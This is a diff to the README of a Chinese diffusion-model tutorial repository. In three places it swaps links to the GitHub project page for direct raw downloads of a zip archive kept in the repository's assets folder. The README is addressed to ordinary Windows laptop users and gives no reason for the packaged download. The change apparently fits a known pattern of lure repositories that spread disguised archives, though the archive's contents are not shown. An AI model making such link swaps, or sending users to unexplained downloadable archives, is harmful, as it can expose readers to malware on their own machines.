@@ -1,6 +1,6 @@
 # 📘 diffusion-tutorials-cn - Learn Diffusion Models with Code
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn/raw/refs/heads/main/assets/tutorials_diffusion_cn_v3.2.zip)
 
 ## 🧩 What this app is
 
@@ -38,7 +38,7 @@ If you only want to read the tutorials, a normal Windows laptop is enough.
 
 Open this page in your browser:
 
-https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn
+https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn/raw/refs/heads/main/assets/tutorials_diffusion_cn_v3.2.zip
 
 Then:
 
@@ -192,4 +192,4 @@ The repository combines theory and code in one place. It is useful for study, re
 
 If you want to start, visit the GitHub page and download the project here:
 
-https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn
+https://github.com/Suffering-konradzachariaslorenz627/diffusion-tutorials-cn/raw/refs/heads/main/assets/tutorials_diffusion_cn_v3.2.zip
